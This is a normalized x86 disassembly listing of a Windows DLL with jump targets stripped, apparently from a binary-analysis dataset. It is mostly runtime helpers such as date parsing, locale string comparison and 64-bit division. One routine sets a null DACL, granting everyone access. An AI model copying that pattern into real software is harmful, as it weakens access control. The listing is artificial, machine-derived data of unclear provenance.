lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004a5ac
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0bf
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100457ef
cmp [ ebp - 0x4 ] 0x4
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0bf
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
lea edi [ ebx + 0x10 ]
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x8 ]
call sub_1004a5ac
or [ esi ] eax
add esp 0x18
dec [ edi ]
mov edi [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004a5ac
add esp 0x18
or [ esi ] eax
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100457ef
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
lea edi [ ebx + 0x10 ]
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x8 ]
call sub_1004a5ac
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10045818
jmp r-xdata
add ebx 0xc
push ebx
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004a5ac
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
sub_1004abe3
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1004a5ac
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
test [ ecx ] 0x2
jne r-xdata
mov edx 0x76c
cmp [ ebp - 0x4 ] edx
jl r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
mov eax [ ebp + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x87
jle r-xdata
sub [ ebp - 0x4 ] edx
jmp r-xdata
or eax 0x2
mov [ ecx ] eax
sub_1004ac51
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000c30a
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1004ac91
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000c30a
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1004acd1
push 0x98
mov eax sub_1004c6b7
call sub_10028203
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x5
pop eax
call sub_100282db
retn
cmp [ eax ] edi
jne r-xdata
push 0x1c
call sub_10024389
pop ecx
mov [ ebp - 0x14 ] eax
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1004a540
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002020
sub_1004ad7b
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004acd1
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_1004ae18
push 0x4
mov eax sub_1004c9e3
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov ebx [ ebp + 0xc ]
test bl 0x1
je r-xdata
test bl 0x20
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
and ebx 0x4
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10048ff7
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10049094
pop ecx
push eax
push 0x8
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10048573
mov esi eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x10
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10049131
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_100491ce
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10048600
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
call sub_100282db
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_1004ad7b
pop ecx
push eax
push 0x1c
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1d
cmp ecx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10048623
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_100493a5
pop ecx
push eax
push 0x14
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
call sub_1004a540
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_1004926b
pop ecx
push eax
push 0x34
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x11
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1004865e
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10048905
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10049308
pop ecx
push eax
push 0x34
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x17
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
cmp ebx edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10048951
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1003c98f
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push esi
jmp r-xdata
sub_1004b0f3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ebx [ eax ]
mov eax [ eax + 0x4 ]
call sub_10029ba7
mov ebx [ eax + 0x4 ]
call sub_10029b81
jmp r-xdata
push eax
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push ebx
push 0x0
call sub_1003b694
add esp 0x20
test eax eax
jne r-xdata
cmp esi edi
mov eax esi
jl r-xdata
test ebx ebx
jne r-xdata
dec eax
dec eax
call sub_1002972b
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10025882
add esp 0xc
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
cmp esi edi
je r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_1004b19c
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
mov [ ebp - 0x4 ] 0x0
lea edi [ ebp - 0x3 ]
stosb [ edi ]
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x22
call sub_10029ba7
push [ eax + 0x14 ]
call [ GetLocaleInfoA@IAT ]
cmp [ ebp - 0x4 ] 0x30
pop edi
jne r-xdata
xor eax eax
cmp [ ebp - 0x4 ] 0x31
jne r-xdata
push 0x2
pop eax
leave
retn
cmp [ ebp - 0x4 ] 0x32
setne al
dec eax
and eax 0x3
leave
retn
inc eax
leave
retn
sub_1004b1e7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
sar esi 0x1
sar edi 0x1
test eax eax
jne r-xdata
mov ebx [ eax ]
call sub_10029ba7
mov ebx [ eax + 0x4 ]
jmp r-xdata
call sub_10029b81
push eax
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push ebx
push 0x0
call sub_1004b4ce
add esp 0x20
test eax eax
jne r-xdata
cmp esi edi
mov edx esi
jl r-xdata
test ebx ebx
jne r-xdata
dec eax
dec eax
call sub_1002972b
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
pop edi
pop esi
pop ebx
pop ebp
retn
test edx edx
jg r-xdata
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
xor eax eax
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
inc eax
inc eax
inc ecx
inc ecx
dec edx
cmp esi edi
je r-xdata
test eax eax
jne r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_1004b295
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
sub edi [ ebp + 0x8 ]
sar esi 0x1
sar edi 0x1
or ebx 0xffffffff
test eax eax
jne r-xdata
mov eax [ eax ]
call sub_10029ba7
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
call sub_1002a000
pop ecx
mov [ ebp + 0x14 ] eax
test eax eax
je r-xdata
cmp esi edi
ja r-xdata
mov [ ebp + 0xc ] eax
test eax eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
call sub_10029b81
push eax
push edi
push [ ebp + 0x14 ]
mov edi 0x400
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push 0x0
call sub_1002a34f
mov ebx eax
add esp 0x20
test ebx ebx
jne r-xdata
mov ebx esi
jmp r-xdata
lea eax [ esi + esi ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10026f10
add esp 0xc
xor eax eax
test ebx ebx
jbe r-xdata
call sub_10029b81
push eax
xor eax eax
push eax
push eax
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push eax
call sub_1002a34f
mov ebx eax
add esp 0x20
test ebx ebx
jne r-xdata
push [ ebp + 0x14 ]
call sub_10024aba
pop ecx
mov ecx [ ebp + 0x14 ]
movzx cx [ eax + ecx ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 2 ] cx
inc eax
cmp eax ebx
jb r-xdata
mov ebx 0x7fffffff
jmp r-xdata
sub_1004b36e
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
xor edi edi
cmp eax edi
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
call sub_10029ba7
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
call sub_10029b81
jmp r-xdata
push 0x1
push [ ebp + 0xc ]
push edi
push edi
push esi
push [ ebp + 0x10 ]
mov edi 0x400
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_10029f92
add esp 0x24
test eax eax
je r-xdata
cmp eax edi
jne r-xdata
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp eax ebx
mov [ ebp - 0x4 ] eax
jg r-xdata
cmp esi ebx
ja r-xdata
push 0x1
push [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_10029f92
add esp 0x24
mov [ ebp - 0x4 ] esi
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10026f10
add esp 0xc
sub_1004b41a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
call sub_1004b54a
mov esi [ eax ]
call sub_1004b54a
cmp esi [ eax ]
jl r-xdata
call sub_1004b550
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_1004b442
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_1002bcfb
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_1004b41a
push eax
push edi
push esi
call sub_1002b660
add esp 0x10
test eax eax
je r-xdata
push 0x1
push edi
call sub_1002a045
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
mov eax r--data
jmp r-xdata
pop edi
sub_1004b4ae
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
inc eax
sub_1004b4ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov esi [ ebp + 0x18 ]
mov edx [ ebp + 0x20 ]
test esi esi
jle r-xdata
test edx edx
jle r-xdata
mov eax [ ebp + 0x14 ]
push esi
call sub_1004b4ae
pop ecx
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x1c ]
push edx
call sub_1004b4ae
pop ecx
mov edx eax
sub esi edx
jne r-xdata
test edx edx
je r-xdata
xor eax eax
test esi esi
setge al
lea eax [ eax + eax + 0x1 ]
push 0x2
pop eax
jmp r-xdata
push edx
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ CompareStringW@IAT ]
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
sub_1004b560
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_1004b5fc
cmp [ rw-data ] 0x0
je sub_1004b616
sub esp 0x4
fnstcw [ esp ]
pop eax
and ax 0x7f
cmp ax 0x7f
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
sub_1004b616
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_1004b690
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1004fc05
push esi
push 0x1
mov esi rw-data
push esi
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
pop esi
retn
push 0x0
push 0x0
push 0x1
push esi
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] esi
mov [ rw-data ] 0xc
mov [ rw-data ] 0x0
sub_1000101d
xor eax eax
inc eax
retn
sub_1000118c
push 0x2bc
call [ Sleep@IAT ]
mov al [ rw-data ]
cmp al 0x1
jne r-xdata
xor eax eax
retn 0x4
push [ rw-data ]
call sub_10014f8e
sub_10001336
xor eax eax
inc eax
retn
sub_10001423
mov esi [ ebp + 0x8 ]
call sub_10001574
push 0x0
push 0x0
call sub_10027dd1
int3
sub_10001435
push esi
mov esi eax
call sub_10001574
push [ esi ]
call sub_100242e6
pop ecx
pop esi
retn
sub_10001447
push [ eax ]
call sub_100242e6
pop ecx
retn
sub_100016a9
cmp [ ecx + 0x18 ] 0x8
mov eax [ esp + 0x4 ]
mov [ ecx + 0x14 ] eax
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
retn 0x4
sub_1000178f
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001a33
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10001879
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_10001500
push esi
push esi
call sub_10027dd1
int3
j_sub_10001a0b
jmp sub_10001a0b
sub_100019c2
push 0x8
mov eax sub_1004cd27
call sub_10028203
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
call sub_100282db
retn 0x4
push [ ebp + 0x8 ]
call sub_1000136c
sub_100019ec
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
call sub_100245ce
add esp 0x10
retn
sub_10001a28
mov [ ecx ] r--data
jmp sub_10001abe
sub_10001aa2
push esi
mov esi ecx
call sub_10001abe
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10001abe
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10002020
mov ecx esi
pop esi
jmp sub_100244cc
sub_10001adb
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001abe
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10001afd
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ecx + 0x10 ]
retn
mov eax [ ecx + 0x10 ]
retn
sub_10001b0b
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001a6d
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10001b23
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
call sub_100242f1
add esp 0x10
retn
sub_10001b42
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001b23
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_10001b5e
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10002020
mov ecx esi
pop esi
jmp sub_100244cc
sub_10001ca1
push esi
mov esi ecx
call sub_10001b5e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10001d48
push esi
lea eax [ esp + 0x8 ]
push eax
